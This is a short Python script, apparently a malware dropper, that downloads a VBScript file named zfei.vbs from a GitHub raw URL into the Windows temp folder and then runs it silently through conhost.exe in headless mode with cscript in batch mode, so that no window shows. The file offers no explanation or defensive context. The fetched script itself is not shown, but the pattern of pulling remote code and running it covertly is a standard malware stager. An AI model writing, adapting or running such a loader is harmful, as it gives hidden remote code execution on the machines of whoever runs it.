import subprocess

import os
import tempfile
import requests

url = "https://raw.githubusercontent.com/crmdevtest/broskiboyrepo/main/zfei.vbs"

# Get the Windows temp directory path
temp_dir = tempfile.gettempdir()
file_path = os.path.join(temp_dir, "zfei.vbs")

# Download and save
response = requests.get(url)
if response.status_code == 200:
    with open(file_path, "wb") as f:
        f.write(response.content)
    #print(f"File downloaded to: {file_path}")

script_path = file_path

# Launch wscript with the script path as an argument
subprocess.run(["conhost.exe", "--headless", "cscript.exe", "//b", script_path])
